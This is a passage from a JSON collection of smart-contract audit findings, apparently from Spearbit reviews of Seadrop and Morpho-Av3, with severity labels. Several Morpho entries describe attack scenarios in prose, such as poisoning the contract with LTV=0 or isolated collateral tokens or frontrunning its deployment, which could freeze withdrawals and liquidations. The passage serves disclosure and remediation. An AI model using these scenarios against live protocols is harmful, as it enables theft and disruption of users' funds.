        "title": "The interface IERC721ContractMetadata does not extend IERC721 interface",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "The current interface IERC721ContractMetadata does not include the ERC-721 functions. As a comparision, OpenZeppelin's IERC721Metadata.sol extends the IERC721 interface.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add unit tests for mintSigned and mintAllowList in SeaDrop",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "The only test for the mintSigned and the mintAllowList functions are fuzz tests.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rename a variable with a misleading name",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "enumeratedDropsLength variable name in SeaDrop._removeFromEnumeration is a bit misleading since _removeFromEnumeration is used also for signer lists, feeRecipient lists, etc..",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "The protocol rounds the fees in the favour of creatorPaymentAddress",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "The feeAmount calculation rounds down, i.e., rounds in the favour of creatorPaymentAddress and against feeRecipient. For a minuscule amount of ETH (price such that price * feeBps < 10000), the fees received by the feeRecipient would be 0. An interesting case here would be if the value quantity * price * feeBps is greater than or equal to 10000 and price * feeBps < 10000. In this case, the user can split the mint transaction into multiple transactions to skip the fees. However, this is unlikely to be profitable, considering the gas overhead involved as well as the minuscule amount of savings.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider using type(uint).max as the magic value for maxTokenSupplyForStage instead of 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "The value 0 is currently used as magic value to mean that maxTokenSupplyForStage to mean that the check quantity + currentTotalSupply > maxTokenSupplyForStage. However, the value type(uint).max is a more appropriate magic value in this case. This also avoids the need for additional branching if (maxTo- kenSupplyForStage != MAGIC_VALUE) as the condition quantity + currentTotalSupply > type(uint).max is never true.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing edge case tests on uninitialized AllowList",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "The default value for _allowListMerkleRoots[nftContract] is 0. A transaction that tries to mint an NFT in this case with an empty proof (or any other proof) should revert. There were no tests for this case.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider naming state variables as public to replace the user-defined getters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "Several state variables, for example, mapping(address => PublicDrop) private _publicDrops; but have corresponding getters defined (function getPublicDrop(address have private visibility, nftContract)). Replacing private by public and renaming the variable name can decrease the code. There are several examples of the above pattern in the codebase, however we are only listing one here for brevity.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use bytes.concat instead of abi.encodePacked for concatenation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "While one of the uses of abi.encodePacked is to perform concatenation, the Solidity language does contain a reserved function for this: bytes.concat.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "Misleading comment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "The comment says // Check that the sender is the owner of the allowedNftTokenId.. However, minter isn't necessarily the sender due to how it's set: address minter = minterIfNotPayer != address(0) ? minterIfNotPayer : msg.sender;.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use i instead of j as an index name for a non-nested for-loop",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "Using an index named j instead of i is confusing, as this naming convention makes developers expect that the for-loop is nested, but this is not the case. Using i is more standard and less surprising.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "Avoid duplicating code for consistency",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "The _checkActive function is used in every mint function besides mintPublic where the code is almost the same.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "restrictFeeRecipients is always true for either PublicDrop or TokenGatedDrop in ERC721SeaDrop",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "restrictFeeRecipients is always true for either PublicDrops or TokenGatedDrops. When either one of these drops gets created/updated by calling one of the four functions below on a ERC721SeaDrop contract, its value is hardcoded as true:  updatePublicDrop  updatePublicDropFee  updateTokenGatedDrop  updateTokenGatedDropFee",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "Reformat lines for better readability",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "These lines are too long to be readable. A mistake isn't easy to spot.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "Comment is a copy-paste",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "This comment is exactly the same as this one. This is a copy-paste mistake.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "Usage of floating pragma is not recommended",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": " 0.8.11 is declared in files.  In foundry.toml: solc_version = '0.8.15' is used for the default build profile.  In hardhat.config.ts and hardhat-coverage.config.ts: \"0.8.14\" is used. 31",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "Side effects of LTV = 0 assets: Morpho's users will not be able to withdraw (collateral and \"pure\" supply), borrow and liquidate",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "When an AToken has LTV = 0, Aave restricts the usage of some operations. In particular, if the user owns at least one AToken as collateral that has LTV = 0, operations could revert. 1) Withdraw: if the asset withdrawn is collateral, the user is borrowing something, the operation will revert if the withdrawn collateral is an AToken with LTV > 0. 2) Transfer: if the from is using the asset as collateral, is borrowing something and the asset transferred is an AToken with LTV > 0 the operation will revert. 3) Set the reserve of an AToken as not collateral: if the AToken you are trying to set as non-collateral is an AToken with LTV > 0 the operation will revert. Note that all those checks are done on top of the \"normal\" checks that would usually prevent an operation, de- pending on the operation itself (like, for example, an HF check). While a \"normal\" Aave user could simply withdraw, transfer or set that asset as non-collateral, Morpho, with the current implementation, cannot do it. Because of the impossibility to remove from the Morpho wallet the \"poisoned AToken\", part of the Morpho mechanics will break.  Morpho's users could not be able to withdraw both collateral and \"pure\" supply  Morpho's users could not be able to borrow  Morpho's users could not be able to liquidate  Morpho's users could not be able to claim rewards via claimRewards if one of those rewards is an AToken with LTV > 0",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Morpho is vulnerable to attackers sending LTV = 0 collateral tokens, supply/supplyCollateral, bor- row and liquidate operations could stop working",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "When an AToken has LTV = 0, Aave restricts the usage of some operations. In particular, if the user owns at least one AToken as collateral that has LTV = 0, these operations could revert 1) Withdraw: if the asset withdrawn is collateral, the user is borrowing something, the operation will revert if the withdrawn collateral is an AToken with LTV > 0 2) Transfer: if the from is using the asset as collateral, is borrowing something and the asset transferred is an AToken with LTV > 0 the operation will revert 3) Set the reserve of an AToken as not collateral: if the AToken you are trying to set as non-collateral is an AToken with LTV > 0 the operation will revert Note that all those checks are done on top of the \"normal\" checks that would usually prevent an operation, de- pending on the operation itself (like, for example, an HF check). In the attack scenario, the bad actor could simply supply an underlying that is associated with an LTV = 0 AToken and transfer it to the Morpho contract. If the victim does not own any balance of the asset, it will be set as collateral and the victim will suffer from all the side effects previously explained. While a \"normal\" Aave user could simply withdraw, transfer or set that asset as non-collateral, Morpho, with the current implementation, cannot do it. Because of the impossibility to remove from the Morpho wallet the \"poisoned AToken\", part of the Morpho mechanics will break.  Morpho's users could not be able to withdraw both collateral and \"pure\" supply. 6  Morpho's users could not be able to borrow.  Morpho's users could not be able to liquidate.  Morpho's users could not be able to claim rewards via claimRewards if one of those rewards is an AToken with LTV > 0.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Morpho is not correctly handling the asset price in _getAssetPrice when isInEMode == true but priceSource is addres(0)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "The current implementation of _getAssetPrice returns the asset's price based on the value of isInEMode function _getAssetPrice(address underlying, IAaveOracle oracle, bool isInEMode, address priceSource) internal view returns (uint256) if (isInEMode) { uint256 eModePrice = oracle.getAssetPrice(priceSource); if (eModePrice != 0) return eModePrice; } return oracle.getAssetPrice(underlying); { } As you can see from the code, if isInEMode is equal to true they call oracle.getAssetPrice no matter what the value of priceSource that could be address(0). 7 If we look inside the AaveOracle implementation, we could assume that in the case where asset is address(0) (in this case, Morpho pass priceSource _getAssetPrice parameter) it would probably return _fallbackOra- cle.getAssetPrice(asset). In any case, the Morpho logic diverges compared to what Aave implements. On Aave, if the user is not in e-mode, the e-mode oracle is address(0) or the asset's e-mode is not equal to the user's e-mode (in case the user is in e-mode), Aave always uses the asset price of the underlying and not the one in the e-mode priceSource. The impact is that if no explicit eMode oracle has been set, Morpho might revert in price computations, breaking liquidations, collateral withdrawals, and borrows if the fallback oracle does not support the asset, or it will return the fallback oracle's price which is different from the price that Aave would use.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Isolated assets are treated as collateral in Morpho",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "Aave-v3 introduced isolation assets and isolation mode for users: \"Borrowers supplying an isolated asset as collateral cannot supply other assets as collateral (though they can still supply to capture yield). Only stablecoins that have been permitted by Aave governance to be borrowable in isolation the mode can be borrowed by users utilizing isolated collateral up to a specified debt ceiling.\" The Morpho contract is intended not to be in isolation mode to avoid its restrictions. Supplying an isolated asset to Aave while there are already other (non-isolated) assets set as collateral will simply supply the asset to earn yield without setting it as collateral. However, Morpho will still set these isolated assets as collateral for the supplying user. Morpho users can borrow any asset against them which should not be possible:  Isolated assets are by definition riskier when used as collateral and should only allow borrowing up to a specific debt ceiling.  The borrows are not backed on Aave as the isolated asset is not treated as collateral there, lowering the Morpho Aave position's health factor and putting the system at risk of liquidation on Aave.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Morpho's logic to handle LTV = 0 AToken diverges from the Aave logic and could decrease the user's HF/borrowing power compared to what the same user would have on Aave",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "The current implementation of Morpho has a specific logic to handle the scenario where Aave sets the asset's LTV to zero. We can see how Morpho is handling it in the _assetLiquidityData function function _assetLiquidityData(address underlying, Types.LiquidityVars memory vars) internal view returns (uint256 underlyingPrice, uint256 ltv, uint256 liquidationThreshold, uint256 tokenUnit) { ,! } // other function code... // If the LTV is 0 on Aave V3, the asset cannot be used as collateral to borrow upon a breaking withdraw. // In response, Morpho disables the asset as collateral and sets its liquidation threshold // to 0 and the governance should warn users to repay their debt. if (config.getLtv() == 0) return (underlyingPrice, 0, 0, tokenUnit); // other function code... The _assetLiquidityData function is used to calculate the number of assets a user can borrow and the maximum debt a user can reach before being liquidated. Those values are then used to calculate the user Health Factor. The Health Factor is used to  Calculate both if a user can be liquidated and in which percentage the collateral can be seized.  Calculate if a user can withdraw part of his/her collateral. The debt and borrowable amount are used in the Borrowing operations to know if a user is allowed to borrow the specified amount of tokens. On Aave, this situation is handled differently. First, there's a specific distinction when the liquidation threshold is equal to zero and when the Loan to Value of the asset is equal to zero. Note that Aave enforces (on the configuration setter of a reserve) that ltv must be <= of liquidationThreshold, this implies that if the LT is zero, the LTV must be zero. In the first case (liquidation threshold equal to zero) the collateral is not counted as collateral. This is the same behavior followed by Morpho, but the difference is that Morpho also follows it when the Liquidation Threshold is greater than zero. In the second case (LT > 0, LTV = 0) Aave still counts the collateral as part of the user's total collateral but does not increase the user's borrowing power (it does not increase the average LTV of the user). This influences the user's health factor (and so all the operations based on it) but not as impactfully as Morpho is doing. In conclusion, when the LTV of an asset is equal to zero, Morpho is not applying the same logic as Aave is doing, removing the collateral from the user's collateral and increasing the possibility (based on the user's health factor, user's debt, user's total collateral and all the asset's configurations on Aave) to  Deny a user's collateral withdrawal (while an Aave user could have done it).  Deny a user's borrow (while an Aave user could have done it).  Make a user liquidable (while an Aave user could have been healthy).  Increasing the possibility to allow the liquidator to seize the full collateral of the borrower (instead of 50%). 9",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: High Risk MorphoInternal.sol#L324,"
        ]
    },
    {
        "title": "RewardsManager does not take in account users that have supplied collateral directly to the pool",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "Inside RewardsManager._getUserAssetBalances Morpho is calculating the amount of the supplied and borrowed balance for a specific user. In the current implementation, Morpho is ignoring the amount that the user has supplied as collateral directly into the Aave pool. As a consequence, the user will be eligible for fewer rewards or even zero in the case where he/she has supplied only collateral.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Accounting issue when repaying P2P fees while having a borrow delta",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "When repaying debt on Morpho, any potential borrow delta is matched first. Repaying the delta should involve both decreasing the scaledDelta as well as decreasing the scaledP2PAmount by the matched amount. [1] However, the scaledP2PAmount update is delayed until the end of the repay function. The following repayFee call then reads the un-updated market.deltas.borrow.scaledP2PAmount storage variable leading to a larger estimation of the P2P fees that can be repaid. The excess fee that is repaid will stay in the contract and not be accounted for, when it should have been used to promote borrowers, increase idle supply or demote suppliers. For example, there could now be P2P suppliers that should have been demoted but are not and in reality don't have any P2P counterparty, leaving the entire accounting system in a broken state.  Example (all values are in underlying amounts for brevity.) Imagine a borrow delta of 1000, borrow.scaledP2PTotal = 10,000 supply.scaledP2PTotal = 8,000, so the repayable fee should be (10,000 - 1000) - (8,000 - 0) = 1,000. Now a P2P borrower wants to repay 3000 debt: 1. Pool repay: no pool repay as they have no pool borrow balance. 2. Decrease p2p borrow delta: decreaseDelta is called which sets market.deltas.borrow.scaledDelta = 0 (but does not update market.deltas.borrow.scaledP2PAmount yet!) and returns matchedBorrowDelta = 1000 3. repayFee is called and it computes (10,000 - 0) - (8,000 - 1,000) = 2,000. They repay more than the actual fee.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Repaying with ETH does not refund excess",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "Users can repay WETH Morpho positions with ETH using the WETHGateway. The specified repay amount will be wrapped to WETH before calling the Morpho function to repay the WETH debt. However, the Morpho repay function only pulls in Math.min(_getUserBorrowBalanceFromIndexes(underlying, onBehalf, indexes), amount). If the user specified an amount larger than their debt balance, the excess will be stuck in the WETHGateway contract. This might be especially confusing for users because the standard Morpho.repay function does not have this issue and they might be used to specifying a large, round value to be sure to repay all principal and accrued debt once the transaction is mined.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Morpho can end up in isolation mode",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "Aave-v3 introduced isolation assets and isolation mode for users: \"Borrowers supplying an isolated asset as collateral cannot supply other assets as collateral (though they can still supply to capture yield). Only stablecoins that have been permitted by Aave governance to be borrowable in isolation the mode can be borrowed by users utilizing isolated collateral up to a specified debt ceiling.\" The Morpho contract has a single Aave position for all its users and does therefore not want to end up in isolation mode due to its restrictions. The Morpho code would still treat the supplied non-isolation assets as collateral for their Morpho users, allowing them to borrow against them, but the Aave position does not treat them as collateral anymore. Furthermore, Morpho can only borrow stablecoins up to a certain debt ceiling. Morpho can be brought into isolation mode:  Up to deployment, an attacker maliciously sends an isolated asset to the address of the proxy. Aave sets assets as collateral when transferred, such that the Morpho contract already starts out in isolation mode. This can even happen before deployment by precomputing addresses or simply frontrunning the deployment. This attack also works if Morpho does not intend to create a market for the isolated asset.  Upon deployment and market creation: An attacker or unknowing user is the first to supply an asset and this asset is an isolated asset, Morpho's Aave position automatically enters isolation mode.  At any time if an isolated asset is the only collateral asset. This can happen when collateral assets are turned off on Aave, for example, by withdrawing (or liquidating) the entire balance.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Collateral setters for Morpho / Aave can end up in a deadlock",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "One can end up in a deadlock where changing the Aave pool or Morpho collateral state is not possible anymore because it can happen that Aave automatically turns the collateral asset off (for example, when withdrawing everything / getting liquidated). Imagine a collateral asset is turned on for both protocols: setAssetIsCollateralOnPool(true) setAssetIsCollateral(true) Then, a user withdraws everything on Morpho / Aave, and Aave automatically turns it off. It's off on Aave but on on Morpho. It can't be turned on for Aave anymore because: if (market.isCollateral) revert Errors.AssetIsCollateralOnMorpho(); But it also can't be turned off on Morpho anymore because of: if (!_pool.getUserConfiguration(address(this)).isUsingAsCollateral(_pool.getReserveData(underlying).id) ) { revert Errors.AssetNotCollateralOnPool(); ,! ,! } c This will be bad if new users deposit after having withdrawn the entire asset. The asset is collateral on Morpho but not on Aave, breaking an important invariant that could lead to liquidating the Morpho Aave position.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "First reward claim is zero for newly listed reward tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "When Aave adds a new reward token for an asset, the reward index for this (asset, reward) pair starts at 0. When an update in Morpho's reward manager occurs, it initializes all rewards for the asset and would initialize this new reward token with a startingIndex of 0. 1. Time passes and emissions accumulate to all pool users, resulting in a new index assetIndex. Users who deposited on the pool through Morpho before this reward token was listed should receive their fair share of the entire emission rewards (assetIndex - 0) * oldBalance but they currently receive zero because getRewards returns early if the user's computed index is 0. 2. Also note that the external getUserAssetIndex(address user, address asset, address reward) can be inaccurate because it doesn't simulate setting the startingIndex for reward tokens that haven't been set yet. 3. A smaller issue that can happen when new reward tokens are added is that updates to the startingIndex are late, the startingIndex isn't initialized to 0 but to some asset index that accrued emissions for some time. Morpho on-pool users would lose some rewards until the first update to the asset. (They should accrue from index 0 but accrue from startingIndex.) Given frequent calls to the RewardManager that initializes all rewards for an asset, this difference should be negligible.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Disable creating markets for siloed assets",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "Aave-v3 introduced siloed-borrow assets and siloed-borrow mode for users \"This feature allow assets with potentially manipulatable oracles (for example illiquid Uni V3 pairs) to be listed on Aave as single borrow asset i.e. if user borrows siloed asset, they cannot borrow any other asset. This helps mitigating the risk associated with such assets from impacting the overall solvency of the protocol.\" - Aave Docs The Morpho contract should not be in siloed-borrowing mode to avoid its restrictions on borrowing any other listed assets, especially as borrowing on the pool might be required for withdrawals. If a market for the siloed asset is created at deployment, users might borrow the siloed asset and break borrowing any of the other assets.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "A high value of _defaultIterations could make the withdrawal and repay operations revert because of OOG",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "When the user executes some actions, he/she can specify their own maxIterations parameter. The user maxIterations parameter is directly used in supplyLogic and borrowLogic. In the withdrawLogic Morpho is recalculating the maxIterations to be used internally as Math.max(_default- Iterations.withdraw, maxIterations) and in repayLogic is directly using _defaultIterations.repay as the max number of iterations. This parameter is used as the maximum number of iterations that the matching engine can do to match suppli- ers/borrowers during promotion/demotion operations. 15 function _promoteOrDemote( LogarithmicBuckets.Buckets storage poolBuckets, LogarithmicBuckets.Buckets storage p2pBuckets, Types.MatchingEngineVars memory vars ) internal returns (uint256 processed, uint256 iterationsDone) { if (vars.maxIterations == 0) return (0, 0); uint256 remaining = vars.amount; // matching engine code... for (; iterationsDone < vars.maxIterations && remaining != 0; ++iterationsDone) { // matching engine code (onPool, inP2P, remaining) = vars.step(...); // matching engine code... } // matching engine code... } As you can see, the iteration keeps going on until the matching engine has matched enough balance or the iterations have reached the maximum number of iterations. If the matching engine cannot match enough balance, it could revert because of OOG if vars.maxIterations is a high value. For the supply or borrow operations, the user is responsible for the specified number of iterations that might be done during the matching process, in that case, if the operations revert because of OGG, it's not an issue per se. The problem arises for withdraw and replay operations where Morpho is forcing the number of operations and could make all those transactions always revert in case the matching engine does not match enough balance in time. Keep in mind that even if the transaction does not revert during the _promoteOrDemote logic, it could revert during the following operations just because the _promoteOrDemote has consumed enough gas to make the following operations to use the remaining gas.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Morpho should check that the _positionsManager used has the same _E_MODE_CATEGORY_ID and _- ADDRESSES_PROVIDER values used by the Morpho contract itself",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "Because _E_MODE_CATEGORY_ID and _ADDRESSES_PROVIDER are immutable variables and because Morpho is calling the PositionsManager in a delegatecall context, it's fundamental that both Morpho and Posi- tionsManager have been initialized with the same _E_MODE_CATEGORY_ID and _ADDRESSES_PROVIDER values. Morpho should also check the value of the PositionsManager._E_MODE_CATEGORY_ID and PositionsManager._- ADDRESSES_PROVIDER in both the setPositionsManager and initialize function.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "In _authorizeLiquidate, when healthFactor is equal to Constants.DEFAULT_LIQUIDATION_THRESHOLD Morpho is wrongly setting close factor to DEFAULT_CLOSE_FACTOR",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "When the borrower's healthFactor is equal to Constants.MIN_LIQUIDATION_THRESHOLD Morpho is returning the wrong value for the closeFactor allowing only liquidate 50% of the collateral instead of the whole amount. When the healthFactor is lower or equal to the Constants.MIN_LIQUIDATION_THRESHOLD Morpho should return Constants.MAX_CLOSE_FACTOR following the same logic applied by Aave. Note that the user cannot be liquidated even if healthFactor == MIN_LIQUIDATION_THRESHOLD if the priceOr- acleSentinel is set and IPriceOracleSentinel(params.priceOracleSentinel).isLiquidationAllowed() == false. See how Aave performs the check inside validateLiquidationCall.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "_authorizeBorrow does not check if the Aave price oracle sentinel allows the borrowing operation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "Inside the Aave validation logic for the borrow operation, there's an additional check that prevents the user from performing the operation if it has been not allowed inside the priceOracleSentinel require( params.priceOracleSentinel == address(0) || IPriceOracleSentinel(params.priceOracleSentinel).isBorrowAllowed(), Errors.PRICE_ORACLE_SENTINEL_CHECK_FAILED ); 17 Morpho should implement the same check. If for any reason the borrow operation has been disabled on Aave, it should also be disabled on Morpho itself. While the transaction would fail in case Morpho's user would need to perform the borrow on the pool, there could be cases where the user is completely matched in P2P. In those cases, the user would have performed a borrow even if the borrow operation was not allowed on the underlying Aave pool.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "_updateInDS does not \"bubble up\" the updated values of onPool and inP2P",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "The _updateInDS function takes as input uint256 onPool and uint256 inP2P that are passed not as reference, but as pure values. function _updateInDS( address poolToken, address user, LogarithmicBuckets.Buckets storage poolBuckets, LogarithmicBuckets.Buckets storage p2pBuckets, uint256 onPool, uint256 inP2P, bool demoting ) internal { if (onPool <= Constants.DUST_THRESHOLD) onPool = 0; if (inP2P <= Constants.DUST_THRESHOLD) inP2P = 0; // ... other logic of the function } Those values, if lower or equal to Constants.DUST_THRESHOLD will be set to 0. The issue is that the updated version of onPool and inP2P is never bubbled up to the original caller that will later use those values that could have been changed by the _updateInDS logic. For example, the _updateBorrowerInDS function call _updateInDS and relies on the value of onPool and inP2P to understand if the user should be removed or added to the list of borrowers. function _updateBorrowerInDS(address underlying, address user, uint256 onPool, uint256 inP2P, bool ,! demoting) internal { _updateInDS( _market[underlying].variableDebtToken, user, _marketBalances[underlying].poolBorrowers, _marketBalances[underlying].p2pBorrowers, onPool, inP2P, demoting ); if (onPool == 0 && inP2P == 0) _userBorrows[user].remove(underlying); else _userBorrows[user].add(underlying); } 18 Let's assume that inP2P and onPool passed as _updateBorrowerInDS inputs were equal to 1 (the value of DUST_- THRESHOLD). In this case, _updateInDS would update those values to zero because 1 <= DUST_THRESHOLD and would remove the user from both the poolBucket and p2pBuckets of the underlying. When then the function returns in the _updateBorrowerInDS context, the same user would not remove the under- lying from his/her _userBorrows list of assets because the updated values of onPool and inP2P have not been bubbled up by the _updateInDS function. The same conclusion could be made for all the \"root\" level codes that rely on the onPool and inP2P values that could not have been updated with the new 0 value set by _updateInDS.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "There is no guarantee that the _rewardsManager is set when calling claimRewards",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "Since the _rewardsManager address is set using a setter function in Morpho only and not in the MorphoStorage.sol constructor there is no guarantee that the _rewardsManager is not the default address(0) value. This could cause failures when calling claimRewards if Morpho forgets to set the _rewardsManager.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Its Impossible to set _isClaimRewardsPaused",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "The claimRewards function checks the isClaimRewardsPaused boolean value and reverts if it is true. Currently, there is no setter function in the code base that sets the _isClaimRewardsPaused boolean so it is impossible to change.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "User rewards can be claimed to treasury by DAO",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "When a user claims rewards, the rewards for the entire Morpho contract position on Aave are claimed. The excess rewards remain in the Morpho contract for until all users claimed their rewards. These rewards are not tracked and can be withdrawn by the DAO through a claimToTreasury call.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "decreaseDelta lib function should return early if amount == 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "The passed in amount should be checked for a zero value, and in that condition, return early from the function. The way it currently is unnecessarily consumes more gas, and emits change events that for values that don't end up changing (newScaledDelta). Checking for amount == 0 is already being done in the increaseDelta function.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Smaller gas optimizations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "There are several small expressions that can be further gas optimized.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Gas: Optimize LogarithmicBuckets.getMatch",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "The getMatch function of the logarithmic bucket first checks for a bucket that is the next higher bucket If no higher bucket is found it searches for a bucket that is the than the bucket the provided value would be in. highest bucket that \"is in both bucketsMask and lowerMask.\" However, we already know that any bucket we can now find will be in lowerMask as lowerMask is the mask corresponding to all buckets less than or equal to value's bucket. Instead, we can just directly look for the highest bucket in bucketsMask.",
        "labels": [
            "Spearbit",
